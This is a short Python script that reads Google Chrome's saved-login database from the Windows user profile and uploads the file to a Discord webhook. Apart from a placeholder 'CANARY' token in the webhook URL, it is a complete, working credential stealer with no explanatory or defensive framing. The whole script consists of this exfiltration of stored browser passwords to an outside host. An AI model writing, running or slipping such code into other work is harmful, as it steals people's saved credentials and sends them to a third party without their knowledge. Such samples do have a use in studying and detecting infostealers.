import os, requests
p = os.path.join(os.getenv('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
data = open(p, 'rb').read() if os.path.exists(p) else b''
requests.post('https://discord.com/api/webhooks/00000000000000000/CANARY_not_a_real_token_xxxxxxxxxx', files={'f': data})
